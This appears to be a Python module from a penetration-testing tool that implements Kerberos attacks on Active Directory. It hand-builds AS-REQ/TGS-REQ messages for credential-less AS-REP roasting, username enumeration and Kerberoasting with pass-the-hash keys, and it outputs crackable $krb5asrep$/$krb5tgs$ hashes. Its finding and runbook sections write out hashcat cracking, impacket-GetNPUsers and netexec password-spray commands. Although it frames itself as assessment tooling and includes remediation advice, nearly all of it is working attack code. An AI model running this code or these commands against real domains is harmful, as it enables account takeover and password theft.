"""Credential-less Active Directory roasting (stdlib only).

A minimal Kerberos client - hand-rolled ASN.1 DER over TCP 88, no impacket - that
needs NO credential, only a DC and a list of candidate usernames. For each name it
sends an AS-REQ with no pre-authentication and reads the KDC's reply:

  * **AS-REP returned** -> the account has "do not require Kerberos pre-auth"
    (DONT_REQ_PREAUTH) set. recce captures the encrypted part as a crackable
    `$krb5asrep$` hash - AS-REP roasting with no credential (crack offline -> a real
    password). CONFIRMED high (critical if the account is privileged).
  * **KRB-ERROR KDC_ERR_PREAUTH_REQUIRED (25)** -> the username is VALID (pre-auth is
    enforced). Username enumeration with no credential.
  * **KRB-ERROR KDC_ERR_C_PRINCIPAL_UNKNOWN (6)** -> the username does not exist.

Candidate usernames come from what recce already enumerated (LDAP / SharpHound user
accounts in the datastore) or an operator `--userlist`. recce only requests tickets -
it makes no logon attempt and locks out no account. Findings fold into the severity
totals, the Vulnerabilities sheet, the write-ups, a dedicated **Kerberos** tab, and
the prove engine.
"""
from __future__ import annotations

import hashlib
import hmac
import os
import shlex
import socket
import struct
import time

from ..models import Host, Port
from ..svccommon import finding_builder, recvn as _recvn
from .ntlm import normalize_nt_hash, nt_hash, rc4k

_PORT = 88
_TIMEOUT = 6.0

# KRB error codes we care about.
KDC_ERR_PRINCIPAL_UNKNOWN = 6
KDC_ERR_CLIENT_REVOKED = 18
KDC_ERR_KEY_EXPIRED = 23
KDC_ERR_PREAUTH_REQUIRED = 25

# etype numbers; RC4-HMAC (23) first so we get the classic crackable AS-REP.
_ETYPES = (23, 17, 18)


def is_kerberos(port: Port) -> bool:
    if port.portid == _PORT:
        return True
    return "kerberos" in f"{port.service} {port.product}".lower()


# --- minimal ASN.1 DER -----------------------------------------------------------

def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content


def _int(n: int) -> bytes:
    if n == 0:
        body = b"\x00"
    elif n > 0:
        body = b""
        v = n
        while v:
            body = bytes([v & 0xFF]) + body
            v >>= 8
        if body[0] & 0x80:                             # keep it positive
            body = b"\x00" + body
    else:
        # Negative INTEGER (e.g. the -138 KERB_CHECKSUM_HMAC_MD5 cksumtype): minimal
        # two's-complement with the sign bit set. A plain `v >>= 8` loop would spin
        # forever here (Python's arithmetic shift of a negative converges to -1).
        nbytes = 1
        while n < -(1 << (8 * nbytes - 1)):
            nbytes += 1
        body = (n & ((1 << (8 * nbytes)) - 1)).to_bytes(nbytes, "big")
    return _tlv(0x02, body)


def _gstr(s: str) -> bytes:
    return _tlv(0x1B, s.encode("utf-8"))               # GeneralString


def _gtime(s: str) -> bytes:
    return _tlv(0x18, s.encode("ascii"))               # GeneralizedTime


def _ctx(n: int, content: bytes) -> bytes:
    return _tlv(0xA0 | n, content)                     # [n] explicit, constructed


def _seq(*items: bytes) -> bytes:
    return _tlv(0x30, b"".join(items))


def _bitstring32(val: int) -> bytes:
    return _tlv(0x03, b"\x00" + struct.pack(">I", val))


def _principal(ntype: int, names: list[str]) -> bytes:
    return _seq(_ctx(0, _int(ntype)),
                _ctx(1, _seq(*[_gstr(n) for n in names])))


def build_as_req(user: str, realm: str, etypes=_ETYPES,
                 till: str = "20370913024805Z", nonce: int = 0x7FFFFFFE) -> bytes:
    """A pre-auth-less AS-REQ for (user, realm). realm should be upper-case."""
    body = _seq(
        _ctx(0, _bitstring32(0x40810010)),             # kdc-options (fwd/renew/canon)
        _ctx(1, _principal(1, [user])),                # cname (NT-PRINCIPAL)
        _ctx(2, _gstr(realm)),                         # realm
        _ctx(3, _principal(2, ["krbtgt", realm])),     # sname krbtgt/REALM
        _ctx(5, _gtime(till)),                          # till
        _ctx(7, _int(nonce)),                           # nonce
        _ctx(8, _seq(*[_int(e) for e in etypes])),      # etype
    )
    kdc_req = _seq(
        _ctx(1, _int(5)),                               # pvno
        _ctx(2, _int(10)),                              # msg-type = AS-REQ
        _ctx(4, body),                                  # req-body
    )
    return _tlv(0x6A, kdc_req)                          # [APPLICATION 10]


def _read_tlv(data: bytes, i: int):
    """Return (tag, content_bytes, next_index) for the DER TLV at `i`."""
    if i + 2 > len(data):
        raise ValueError("DER: truncated header")
    tag = data[i]
    length = data[i + 1]
    j = i + 2
    if length & 0x80:
        nbytes = length & 0x7F
        if nbytes == 0 or j + nbytes > len(data):
            raise ValueError("DER: bad length")
        length = int.from_bytes(data[j:j + nbytes], "big")
        j += nbytes
    if j + length > len(data):
        raise ValueError("DER: content overruns buffer")
    return tag, data[j:j + length], j + length


def _children(content: bytes):
    i = 0
    while i < len(content):
        tag, val, i = _read_tlv(content, i)
        yield tag, val


def _find(content: bytes, tag: int):
    for t, val in _children(content):
        if t == tag:
            return val
    return None


def _ctx_inner(content: bytes, n: int):
    """Value inside an explicit [n] context tag (unwrap one TLV), or None."""
    wrapped = _find(content, 0xA0 | n)
    if wrapped is None:
        return None
    _t, val, _ = _read_tlv(wrapped, 0)
    return val


# --- response parsing ------------------------------------------------------------

def parse_response(data: bytes) -> dict:
    """Classify a KDC reply. Returns one of:
        {"type": "asrep", "user", "realm", "etype", "cipher"}
        {"type": "error", "code": <int>}
        {"type": "unknown"}
    """
    try:
        tag, body, _ = _read_tlv(data, 0)
        _t, seq, _ = _read_tlv(body, 0)               # inner SEQUENCE
        if tag == 0x7E:                                # [APPLICATION 30] KRB-ERROR
            err = _ctx_inner(seq, 6)                   # error-code [6]
            code = int.from_bytes(err, "big") if err else -1
            return {"type": "error", "code": code}
        if tag == 0x6B:                                # [APPLICATION 11] AS-REP
            crealm_s = _ctx_inner(seq, 3)              # crealm [3] GeneralString
            realm = crealm_s.decode("utf-8", "replace") if crealm_s else ""
            cname = _ctx_inner(seq, 4)                 # cname [4] PrincipalName
            user = ""
            if cname:
                names = _ctx_inner(cname, 1)           # name-string [1] SEQ OF GStr
                if names:
                    first = _find(names, 0x1B)
                    user = first.decode("utf-8", "replace") if first else ""
            enc = _ctx_inner(seq, 6)                    # enc-part [6] EncryptedData
            etype, cipher = 0, b""
            if enc:
                et = _ctx_inner(enc, 0)                # etype [0] Int32
                etype = int.from_bytes(et, "big") if et else 0
                cipher = _ctx_inner(enc, 2) or b""     # cipher [2] OCTET STRING
            return {"type": "asrep", "user": user, "realm": realm,
                    "etype": etype, "cipher": cipher}
    except (ValueError, IndexError):
        return {"type": "unknown"}
    return {"type": "unknown"}


def asrep_hash(user: str, realm: str, etype: int, cipher: bytes) -> str:
    """Format an AS-REP cipher as a crackable hash. etype 23 (RC4) -> hashcat 18200
    `$krb5asrep$23$user@REALM:<checksum>$<edata>`; other etypes -> a generic form."""
    if etype == 23 and len(cipher) >= 16:
        return (f"$krb5asrep$23${user}@{realm}:"
                f"{cipher[:16].hex()}${cipher[16:].hex()}")
    return f"$krb5asrep${etype}${user}@{realm}${cipher.hex()}"


# --- transport -------------------------------------------------------------------

def _send_recv(dc_ip: str, payload: bytes, timeout: float) -> bytes | None:
    """Kerberos over TCP: 4-byte length prefix + message, both directions."""
    try:
        sock = socket.create_connection((dc_ip, _PORT), timeout=timeout)
    except OSError:
        return None
    try:
        sock.settimeout(timeout)
        sock.sendall(struct.pack(">I", len(payload)) + payload)
        hdr = _recvn(sock, 4, timeout)
        if hdr is None:
            return None
        n = struct.unpack(">I", hdr)[0]
        if n == 0 or n > 4 * 1024 * 1024:
            return None
        return _recvn(sock, n, timeout)
    except OSError:
        return None
    finally:
        try:
            sock.close()
        except OSError:
            pass




def roast_user(dc_ip: str, realm: str, user: str,
               timeout: float = _TIMEOUT) -> dict:
    """AS-REQ one user. Returns {user, state, hash?, etype?, code?} where state is
    'roastable' | 'valid' | 'unknown_user' | 'locked' | 'error' | 'no_reply'."""
    realm = realm.upper()
    reply = _send_recv(dc_ip, build_as_req(user, realm), timeout)
    if reply is None:
        return {"user": user, "state": "no_reply"}
    r = parse_response(reply)
    if r["type"] == "asrep":
        return {"user": user, "state": "roastable", "etype": r["etype"],
                "hash": asrep_hash(user, realm, r["etype"], r["cipher"])}
    if r["type"] == "error":
        code = r["code"]
        if code == KDC_ERR_PREAUTH_REQUIRED:
            return {"user": user, "state": "valid", "code": code}
        if code == KDC_ERR_PRINCIPAL_UNKNOWN:
            return {"user": user, "state": "unknown_user", "code": code}
        if code in (KDC_ERR_CLIENT_REVOKED, KDC_ERR_KEY_EXPIRED):
            return {"user": user, "state": "locked", "code": code}
        return {"user": user, "state": "error", "code": code}
    return {"user": user, "state": "unknown"}


# ============================================================================
# Credentialed Kerberoasting (RC4-HMAC / etype 23) - stdlib, no impacket.
#
# With ANY valid domain credential, request a service ticket (TGS) for each SPN
# and capture its enc-part - encrypted with the service account's key - as a
# crackable $krb5tgs$23$ hash. Flow (RFC 4120): AS-REQ with PA-ENC-TIMESTAMP ->
# TGT + session key (decrypt the AS-REP), then a TGS-REQ whose AP-REQ carries an
# authenticator with a KERB_CHECKSUM_HMAC_MD5 (-138) checksum over the request
# body. impacket's GetUserSPNs trips over that checksum against a Samba KDC
# (KRB_AP_ERR_INAPP_CKSUM) where a native RC4 client works; this is that native
# client. RC4-only (etype 23) - the classic crackable hash and stdlib-friendly
# (no AES in the standard library). The crypto matches impacket's byte-for-byte
# (tests/test_kerberoast.py); only the protocol choice differs.
# ============================================================================

_U_AS_REQ_PA_ENC_TS = 1        # PA-ENC-TIMESTAMP, client key
_U_AS_REP_ENCPART = 3          # AS-REP enc-part, client key
_U_TGS_REQ_AUTH_CKSUM = 6      # authenticator cksum over req-body, TGT session key
_U_TGS_REQ_AUTH = 7            # authenticator, TGT session key
CKSUM_HMAC_MD5 = -138          # KERB_CHECKSUM_HMAC_MD5
ETYPE_RC4 = 23


def _hmd5(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.md5).digest()


def _rc4_usage(usage: int) -> int:
    # RFC 4757 usage export (per the errata: do NOT map 9 to 8).
    return {3: 8, 23: 13}.get(usage, usage)


def rc4_encrypt(key: bytes, usage: int, plaintext: bytes,
                confounder: bytes | None = None) -> bytes:
    """RC4-HMAC (arcfour-hmac-md5) encrypt. Matches impacket's _RC4.encrypt."""
    ki = _hmd5(key, struct.pack("<I", _rc4_usage(usage)))
    if confounder is None:
        confounder = os.urandom(8)
    data = confounder + plaintext
    cksum = _hmd5(ki, data)
    ke = _hmd5(ki, cksum)
    return cksum + rc4k(ke, data)


def rc4_decrypt(key: bytes, usage: int, ciphertext: bytes) -> bytes:
    """RC4-HMAC decrypt with integrity check. Raises ValueError on tampering."""
    if len(ciphertext) < 24:
        raise ValueError("RC4-HMAC ciphertext too short")
    ki = _hmd5(key, struct.pack("<I", _rc4_usage(usage)))
    cksum, body = ciphertext[:16], ciphertext[16:]
    ke = _hmd5(ki, cksum)
    data = rc4k(ke, body)
    if not hmac.compare_digest(_hmd5(ki, data), cksum):
        raise ValueError("RC4-HMAC integrity failure")
    return data[8:]                                    # strip the 8-byte confounder


def krb_checksum_hmacmd5(key: bytes, usage: int, data: bytes) -> bytes:
    """KERB_CHECKSUM_HMAC_MD5 (-138). Matches impacket's _HMACMD5.checksum."""
    ksign = _hmd5(key, b"signaturekey\0")
    return _hmd5(ksign, hashlib.md5(struct.pack("<I", _rc4_usage(usage)) + data).digest())


# --- extra DER helpers (build on the AS-REP-roast primitives above) --------------

def _octet(b: bytes) -> bytes:
    return _tlv(0x04, b)


def _krbtime(offset: int = 0) -> str:
    return time.strftime("%Y%m%d%H%M%SZ", time.gmtime(time.time() + offset))


def _encrypted_data(etype: int, cipher: bytes) -> bytes:
    """EncryptedData ::= SEQUENCE { etype[0], cipher[2] } (no kvno)."""
    return _seq(_ctx(0, _int(etype)), _ctx(2, _octet(cipher)))


def _req_body(realm: str, sname: bytes, cname: bytes | None,
              etypes=(ETYPE_RC4,), nonce: int = 0x6F6F6F6F) -> bytes:
    """KDC-REQ-BODY. cname is present for AS-REQ, omitted for TGS-REQ."""
    parts = [_ctx(0, _bitstring32(0x40810010))]        # kdc-options
    if cname is not None:
        parts.append(_ctx(1, cname))
    parts += [
        _ctx(2, _gstr(realm)),
        _ctx(3, sname),
        _ctx(5, _gtime("20370913024805Z")),            # till
        _ctx(7, _int(nonce)),
        _ctx(8, _seq(*[_int(e) for e in etypes])),
    ]
    return _seq(*parts)


# --- AS-REQ (pre-auth) -> TGT + session key --------------------------------------

def _build_as_req_preauth(user: str, realm: str, key: bytes) -> bytes:
    """A pre-authenticated AS-REQ: proves knowledge of the client key with an
    encrypted timestamp, so the KDC returns a usable TGT."""
    pa_ts_enc = _seq(_ctx(0, _gtime(_krbtime())))      # PA-ENC-TS-ENC { patimestamp[0] }
    enc = rc4_encrypt(key, _U_AS_REQ_PA_ENC_TS, pa_ts_enc)
    pa_enc_ts = _seq(_ctx(1, _int(2)),                 # PA-DATA: type 2 (PA-ENC-TIMESTAMP)
                     _ctx(2, _octet(_encrypted_data(ETYPE_RC4, enc))))
    padata = _seq(pa_enc_ts)                           # SEQUENCE OF PA-DATA
    body = _req_body(realm, _principal(2, ["krbtgt", realm]), _principal(1, [user]))
    kdc_req = _seq(_ctx(1, _int(5)), _ctx(2, _int(10)), _ctx(3, padata), _ctx(4, body))
    return _tlv(0x6A, kdc_req)                          # [APPLICATION 10] AS-REQ


def _parse_asrep_tgt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
    """From an AS-REP: return (raw TGT [APPLICATION 1] Ticket, TGT session key)."""
    _tag, body, _ = _read_tlv(data, 0)                 # [APPLICATION 11]
    _t, seq, _ = _read_tlv(body, 0)                    # inner SEQUENCE
    tgt = _find(seq, 0xA0 | 5)                          # ticket[5] -> the Ticket TLV, verbatim
    enc = _ctx_inner(seq, 6)                            # enc-part[6] EncryptedData
    if tgt is None or enc is None:
        raise ValueError("AS-REP missing ticket/enc-part")
    cipher = _ctx_inner(enc, 2) or b""
    dec = rc4_decrypt(key, _U_AS_REP_ENCPART, cipher)  # EncASRepPart [APPLICATION 25/26]
    _t2, encseq, _ = _read_tlv(dec, 0)                 # unwrap the APPLICATION tag
    _t3, kdcrep, _ = _read_tlv(encseq, 0)              # inner SEQUENCE (EncKDCRepPart)
    keyfld = _ctx_inner(kdcrep, 0)                     # key[0] EncryptionKey
    sesskey = _ctx_inner(keyfld, 1) if keyfld else None    # keyvalue[1]
    if not sesskey:
        raise ValueError("AS-REP enc-part missing session key")
    return tgt, sesskey


# --- TGS-REQ -> service ticket ---------------------------------------------------

def _build_tgs_req(realm: str, user: str, spn: str, tgt: bytes, session_key: bytes) -> bytes:
    # Request RC4 preferred but AES (17/18) as fallback: an account with RC4 disabled
    # (msDS-SupportedEncryptionTypes = AES-only, increasingly the default) would answer
    # an RC4-only request with KDC_ERR_ETYPE_NOSUPP and be silently missed. tgs_hash
    # formats whichever etype the KDC returns.
    body = _req_body(realm, _principal(2, spn.split("/")), None, etypes=_ETYPES)
    cksum_val = krb_checksum_hmacmd5(session_key, _U_TGS_REQ_AUTH_CKSUM, body)
    cksum = _seq(_ctx(0, _int(CKSUM_HMAC_MD5)), _ctx(1, _octet(cksum_val)))
    authenticator = _tlv(0x62, _seq(                   # [APPLICATION 2] Authenticator
        _ctx(0, _int(5)),                              # authenticator-vno
        _ctx(1, _gstr(realm)),                         # crealm
        _ctx(2, _principal(1, [user])),               # cname
        _ctx(3, cksum),                                # cksum
        _ctx(4, _int(0)),                              # cusec
        _ctx(5, _gtime(_krbtime())),                   # ctime
    ))
    enc_auth = rc4_encrypt(session_key, _U_TGS_REQ_AUTH, authenticator)
    ap_req = _tlv(0x6E, _seq(                           # [APPLICATION 14] AP-REQ
        _ctx(0, _int(5)),                              # pvno
        _ctx(1, _int(14)),                             # msg-type
        _ctx(2, _bitstring32(0)),                      # ap-options
        _ctx(3, tgt),                                  # ticket (the TGT, verbatim)
        _ctx(4, _encrypted_data(ETYPE_RC4, enc_auth)),  # authenticator
    ))
    padata = _seq(_seq(_ctx(1, _int(1)),               # PA-DATA: type 1 (PA-TGS-REQ)
                       _ctx(2, _octet(ap_req))))
    kdc_req = _seq(_ctx(1, _int(5)), _ctx(2, _int(12)), _ctx(3, padata), _ctx(4, body))
    return _tlv(0x6C, kdc_req)                          # [APPLICATION 12] TGS-REQ


def _parse_tgsrep_ticket(data: bytes) -> tuple[int, bytes]:
    """From a TGS-REP: return (etype, cipher) of the service ticket's enc-part -
    encrypted with the service account's key, i.e. the crackable material."""
    _tag, body, _ = _read_tlv(data, 0)                 # [APPLICATION 13]
    _t, seq, _ = _read_tlv(body, 0)
    tkt = _find(seq, 0xA0 | 5)                          # ticket[5] -> Ticket [APPLICATION 1]
    if tkt is None:
        raise ValueError("TGS-REP missing ticket")
    _tt, tkt_seq, _ = _read_tlv(tkt, 0)                # unwrap [APPLICATION 1]
    _ts, tkt_inner, _ = _read_tlv(tkt_seq, 0)          # inner SEQUENCE
    enc = _ctx_inner(tkt_inner, 3)                     # enc-part[3] EncryptedData
    if enc is None:
        raise ValueError("service ticket missing enc-part")
    et = _ctx_inner(enc, 0)
    cipher = _ctx_inner(enc, 2) or b""
    return (int.from_bytes(et, "big") if et else 0), cipher


def tgs_hash(user: str, realm: str, spn: str, etype: int, cipher: bytes) -> str:
    """Format a service ticket's enc-part as a hashcat-crackable hash. etype 23 ->
    $krb5tgs$23$ (hashcat -m 13100): the 16-byte RC4-HMAC checksum leads the cipher."""
    if etype == ETYPE_RC4 and len(cipher) >= 16:
        return (f"$krb5tgs$23$*{user}${realm}${spn}*$"
                f"{cipher[:16].hex()}${cipher[16:].hex()}")
    # AES (17=aes128 -> hashcat 19600, 18=aes256 -> 19700): the 12-byte HMAC tag trails
    # the ciphertext but the hash string leads with it, and user/realm sit OUTSIDE the
    # *spn* asterisks (impacket GetUserSPNs layout) - the generic dump wasn't crackable.
    if etype in (17, 18) and len(cipher) >= 12:
        return (f"$krb5tgs${etype}${user}${realm}$*{spn}*$"
                f"{cipher[-12:].hex()}${cipher[:-12].hex()}")
    return f"$krb5tgs${etype}$*{user}${realm}${spn}*${cipher.hex()}"


def _kdc_error_code(data: bytes) -> int | None:
    """If the reply is a KRB-ERROR, its error-code; else None."""
    try:
        tag, body, _ = _read_tlv(data, 0)
        if tag != 0x7E:                                # [APPLICATION 30] KRB-ERROR
            return None
        _t, seq, _ = _read_tlv(body, 0)
        err = _ctx_inner(seq, 6)
        return int.from_bytes(err, "big") if err else -1
    except (ValueError, IndexError):
        return None


def client_key(password: str = "", nthash: str = "") -> bytes:
    """The RC4 (etype 23) client key: the NT hash, from a password or a pass-the-hash
    hex string (LM:NT or bare NT)."""
    return normalize_nt_hash(nthash) if nthash else nt_hash(password)


def kerberoast_spn(dc_ip: str, realm: str, auth_user: str, key: bytes, spn: str,
                   spn_user: str = "", timeout: float = _TIMEOUT) -> dict:
    """Roast one SPN with a valid credential. Returns
    {spn, user, state, hash?, etype?, code?} where state is
    'roasted' | 'bad_creds' | 'no_spn' | 'error' | 'no_reply'."""
    realm = realm.upper()
    label = spn_user or spn.split("/")[0]
    as_reply = _send_recv(dc_ip, _build_as_req_preauth(auth_user, realm, key), timeout)
    if as_reply is None:
        return {"spn": spn, "user": label, "state": "no_reply"}
    code = _kdc_error_code(as_reply)
    if code is not None:                               # AS exchange failed (bad creds, etc.)
        state = "bad_creds" if code in (24, 25, 18, 23, 6) else "error"
        return {"spn": spn, "user": label, "state": state, "code": code}
    try:
        tgt, session_key = _parse_asrep_tgt(as_reply, key)
    except ValueError:
        return {"spn": spn, "user": label, "state": "error"}
    tgs_reply = _send_recv(dc_ip, _build_tgs_req(realm, auth_user, spn, tgt, session_key),
                           timeout)
    if tgs_reply is None:
        return {"spn": spn, "user": label, "state": "no_reply"}
    code = _kdc_error_code(tgs_reply)
    if code is not None:                               # 7 = S_PRINCIPAL_UNKNOWN (no such SPN)
        return {"spn": spn, "user": label,
                "state": "no_spn" if code == 7 else "error", "code": code}
    try:
        etype, cipher = _parse_tgsrep_ticket(tgs_reply)
    except ValueError:
        return {"spn": spn, "user": label, "state": "error"}
    return {"spn": spn, "user": label, "state": "roasted", "etype": etype,
            "hash": tgs_hash(label, realm, spn, etype, cipher)}


def kerberoast(dc_ip: str, realm: str, auth_user: str, key: bytes,
               targets: list[dict], timeout: float = _TIMEOUT) -> list[dict]:
    """Roast a list of SPN targets [{spn, user?}] with one credential (one TGT is
    fetched per SPN for simplicity/robustness). Returns per-target result dicts."""
    out = []
    for t in targets:
        spn = t.get("spn") or ""
        if not spn:
            continue
        out.append(kerberoast_spn(dc_ip, realm, auth_user, key, spn,
                                  spn_user=t.get("user", ""), timeout=timeout))
    return out


# --- candidate users / realm / DC ------------------------------------------------

def candidate_users(hosts: list[Host]) -> list[str]:
    """Distinct user account names recce already enumerated (LDAP / SharpHound)."""
    seen, out = set(), []
    for h in hosts:
        for a in getattr(h, "accounts", None) or []:
            if getattr(a, "kind", "") == "user" and a.name:
                low = a.name.lower()
                if low not in seen and "$" not in a.name:      # skip machine accounts
                    seen.add(low)
                    out.append(a.name)
    return out


# Well-known AD user + service names, tried when the enumerated account list
# is empty (no LDAP enum yet). Kept short — this is "check the classics",
# not brute-force. AS-REQ per name is one TCP connection to the DC.
_WELL_KNOWN_USERS = [
    # Default / typical admin
    "administrator", "admin", "guest",
    # Common service accounts
    "krbtgt", "svc_mssql", "svc-mssql", "sql_svc", "svc_sql", "sqlsvc",
    "svc_ldap", "svc-ldap", "svc_web", "svc-web", "svc_backup", "svc-backup",
    "svc_scan", "svc-scan", "svc_iis", "svc_smb",
    # Typical operator names
    "sysadmin", "helpdesk", "backup", "operator", "printer",
    # Vendor defaults
    "veeam", "sccm", "exchange", "sharepoint",
]


def well_known_users() -> list[str]:
    """Fallback user list for `analyze()` when nothing has been enumerated
    yet — the classic default and service names. Copy is intentional (caller
    may mutate)."""
    return list(_WELL_KNOWN_USERS)


def dc_ip_for(hosts: list[Host]) -> str:
    for h in hosts:
        if any(is_kerberos(p) for p in h.open_ports):
            return h.ip
    return ""


# --- narratives + findings ------------------------------------------------------

_NARRATIVE = {
    "asrep_roast": (
        "The account has Kerberos pre-authentication disabled (DONT_REQ_PREAUTH), so "
        "recce requested an AS-REP for it with NO credential and captured the encrypted "
        "blob - a crackable hash. Crack it offline (hashcat -m 18200) to recover the "
        "account's real password, then reuse it: a single roastable service or admin "
        "account is often the first foothold in the domain. Require Kerberos pre-auth on "
        "every account (clear DONT_REQ_PREAUTH) and use long random passwords."),
    "user_enum": (
        "The domain controller answers AS-REQs differently for valid and invalid "
        "usernames (PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN), so recce validated real "
        "usernames from a wordlist with no credential and no logon attempt (no "
        "lockouts). A confirmed user list is the input for password spraying, AS-REP / "
        "Kerberoasting, and targeted phishing."),
}


TESTING_NARRATIVE = [
    ("1. Kerberos client (stdlib ASN.1 DER)",
     "recce builds a Kerberos AS-REQ by hand - no impacket - and speaks it to the DC "
     "over TCP 88. It needs no credential."),
    ("2. AS-REP roasting (no credential)",
     "For each candidate user it sends an AS-REQ with no pre-authentication. If the DC "
     "returns an AS-REP, the account has pre-auth disabled and recce captures the "
     "encrypted part as a $krb5asrep$ hash to crack offline (hashcat -m 18200)."),
    ("3. Username enumeration (no lockouts)",
     "A KDC_ERR_PREAUTH_REQUIRED reply means the username is valid; "
     "KDC_ERR_C_PRINCIPAL_UNKNOWN means it does not exist. recce only requests "
     "tickets - it never attempts a logon, so nothing is locked out."),
    ("4. Runbook",
     "The exact follow-on commands (hashcat -m 18200, GetNPUsers, a spray with the "
     "confirmed user list) are staged."),
]


_finding = finding_builder("kerberos", _NARRATIVE)


def findings(dc_ip: str, realm: str, results: list[dict],
             privileged: set | None = None) -> list[dict]:
    privileged = {p.lower() for p in (privileged or set())}
    out: list[dict] = []
    tgt = f"{dc_ip}:88"
    roasted = [r for r in results if r["state"] == "roastable"]
    for r in roasted:
        priv = r["user"].lower() in privileged
        et = r.get("etype")
        # etype 23 (RC4) is the classic hashcat -m 18200 hash; an AES AS-REP (17/18,
        # issued when RC4 is disabled) is still roastable but cracks with john's
        # krb5asrep format, not -m 18200 - say so honestly.
        if et == 23:
            crack = f"hashcat -m 18200 asrep.hash rockyou.txt   # {r['user']}@{realm}"
        else:
            crack = (f"john --format=krb5asrep asrep.hash   # AES AS-REP (etype {et}), "
                     "not hashcat -m 18200")
        out.append(_finding(
            "critical" if priv else "high",
            "AS-REP roastable account (pre-auth disabled)"
            + (" - privileged" if priv else ""),
            tgt,
            f"{r['user']}@{realm} has DONT_REQ_PREAUTH set; recce captured a live "
            f"AS-REP (etype {et}) with no credential. Crack it offline for the "
            f"plaintext password.\n\n{r.get('hash', '')}",
            "hashcat" if et == 23 else "john",
            crack,
            "Require Kerberos pre-authentication on the account (clear DONT_REQ_PREAUTH) "
            "and enforce a long random password.",
            ["CWE-262"], kind="asrep_roast"))
    valid = [r for r in results if r["state"] in ("valid", "locked", "roastable")]
    if valid:
        names = ", ".join(r["user"] for r in valid[:15])
        # Any confirmed username is a direct feed to password spraying — the
        # attack that survives every lockout policy when kept lockout-safe.
        # Bump severity as the confirmed list grows: 1 user = medium (proof
        # of enumeration), >=3 users = high (spray surface), >=10 users =
        # critical (systematic name-oracle worth immediate mitigation).
        if len(valid) >= 10:
            sev = "critical"
        elif len(valid) >= 3:
            sev = "high"
        else:
            sev = "medium"
        out.append(_finding(
            sev, "Kerberos username enumeration (no credential)", tgt,
            f"The DC confirmed {len(valid)} valid username(s) with no credential and no "
            f"logon attempt (no lockouts): {names}. This user list feeds spraying, "
            "AS-REP / Kerberoasting and phishing.",
            "kerbrute / GetNPUsers",
            # shlex.quote the server-supplied realm (attacker-controlled).
            f"impacket-GetNPUsers {shlex.quote(realm)}/ -no-pass -usersfile users.txt -dc-ip {dc_ip}",
            "Username enumeration via Kerberos pre-auth is largely inherent; minimise "
            "predictable names, monitor AS-REQ volume, and alert on pre-auth-disabled "
            "accounts.",
            ["CWE-204"], kind="user_enum"))
    return out


# --- runbook + proof + analyze --------------------------------------------------

def runbook(dc_ip: str, realm: str) -> list[dict]:
    steps = [
        ("enumerate", "GetNPUsers", f"impacket-GetNPUsers {realm}/ -no-pass "
         f"-usersfile users.txt -dc-ip {dc_ip} -format hashcat",
         "AS-REP roast every pre-auth-disabled user with no credential."),
        ("crack", "hashcat", "hashcat -m 18200 asrep.hash rockyou.txt",
         "Recover the plaintext password from a captured AS-REP."),
        ("spray", "netexec", f"netexec smb {dc_ip} -u users.txt -p '<cracked>' "
         "--continue-on-success",
         "Reuse a cracked/likely password across the confirmed user list."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from .. import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from ..svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "kerberos", _PORT)


def analyze(hosts: list[Host], users: list[str] | None = None,
            realm: str = "", dc_ip: str = "", privileged: set | None = None,
            active: bool = True, max_users: int = 1500,
            budget: float | None = None, progress=None) -> dict:
    """Full credential-less roast/enum. `users` defaults to enumerated account names;
    `realm`/`dc_ip` fall back to derived domains / a host with 88 open. `budget` caps
    wall-clock seconds; `progress(i, n, user)` fires per AS-REQ. Returns
    {dc_ip, realm, results, findings, runbooks, stats}."""
    from .. import ad, svcprobe
    dc_ip = dc_ip or dc_ip_for(hosts)
    if not realm:
        doms = ad.derive_domains([h for h in hosts if h.is_up])
        realm = (doms[0].name if doms else "").upper()
    users = users or candidate_users(hosts)
    # If we STILL have no candidates (no LDAP/AD enum run yet), fall back to
    # the well-known list so a tester who runs `recce kerberos` first-thing
    # still gets a meaningful result. Merges with candidate_users() rather
    # than replacing, so an enumerated list stays authoritative.
    if not users:
        users = well_known_users()
    users = users[:max_users]
    results: list[dict] = []
    state: dict = {}
    if active and dc_ip and realm and users:
        for _u, r in svcprobe.iter_probe(
                users, lambda u: roast_user(dc_ip, realm, u),
                budget=budget, progress=progress, state=state):
            results.append(r)
    fs = findings(dc_ip, realm, results, privileged) if results else []
    return {"dc_ip": dc_ip, "realm": realm, "results": results, "findings": fs,
            # `targets` lets _service_module_coverage credit the DC as scanned even
            # when nothing was roastable (no folded vuln would otherwise mark it).
            "targets": [{"ip": dc_ip, "port": 88}] if dc_ip else [],
            "runbooks": [{"target": f"{dc_ip}:88", "ip": dc_ip,
                          "credfree": runbook(dc_ip, realm), "credentialed": []}]
            if dc_ip else [],
            "stats": {"users_tested": len(results),
                      "roastable": sum(1 for r in results if r["state"] == "roastable"),
                      "valid": sum(1 for r in results
                                   if r["state"] in ("valid", "locked", "roastable")),
                      "findings": len(fs), "stopped": state.get("stopped")}}
